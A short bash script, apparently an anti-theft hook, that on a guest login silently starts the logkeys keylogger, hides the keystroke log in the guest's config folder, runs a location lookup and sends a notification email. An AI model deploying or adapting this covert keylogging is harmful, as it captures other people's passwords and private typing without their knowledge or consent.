#!/usr/bin/env bash

if ( who | grep -q guest ); then
	user=$( who | grep guest | awk '{print $1}' ) #Had to do this way because this scritp needs to be run as root
    if [ ! -d /tmp/$user/.config/logkeys ]; then
		logkeys -k
		mkdir /tmp/$user/.config/logkeys
		touch /tmp/$user/.config/logkeys/user.log
		logkeys -s -m /usr/share/logkeys/keymaps/en_US_ubuntu_1204.map -o /tmp/$user/.config/logkeys/user.log #Run logkeys (Choose your keymap here!)
    fi	
	locationmagic.sh -locate linux <TOKEN> #Replace <TOKEN> by your Token here!
	/usr/local/bin/send_email.py $user #Send notification e-mail
	
	#For testing purposes enable below lines (if enabled guest user can access log file on Desktop)	
	#cp /tmp/$user/.config/logkeys/user.log /tmp/$user/Desktop
	#chown $user:$user /tmp/$user/Desktop/user.log
else
	logkeys -k #Stop logkeys
fi
